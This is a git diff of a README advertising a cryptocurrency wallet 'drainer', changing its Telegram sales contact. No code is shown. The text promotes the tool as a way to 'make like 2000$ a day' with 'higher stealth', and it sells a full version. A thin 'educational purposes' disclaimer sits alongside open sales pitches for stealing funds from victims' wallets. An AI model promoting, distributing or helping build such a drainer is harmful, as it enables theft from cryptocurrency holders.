@@ -1,6 +1,6 @@
-### For direct drain to your wallet with no custom smart contract: https://t.me/uselesslogger
+### For direct drain to your wallet with no custom smart contract: https://t.me/CyberDrainer
 
-#### Please only use this for educational purposes and not to hack others. This is just a demo version of the actual product. The actual product have a more realistic web interface and higher stealth. Buy it here: https://t.me/uselesslogger
+#### Please only use this for educational purposes and not to hack others. This is just a demo version of the actual product. The actual product have a more realistic web interface and higher stealth. Buy it here: https://t.me/CyberDrainer
 
 This is the same method pro hackers use to make millions
 
@@ -23,4 +23,4 @@ You could make like 2000$ a day with this drainer
 
 ---
 
-### Please note that this is just a demo version of the actual product. The actual product have a more realistic web interface and higher stealth. Buy it here: https://t.me/uselesslogger
+### Please note that this is just a demo version of the actual product. The actual product have a more realistic web interface and higher stealth. Buy it here: https://t.me/CyberDrainer
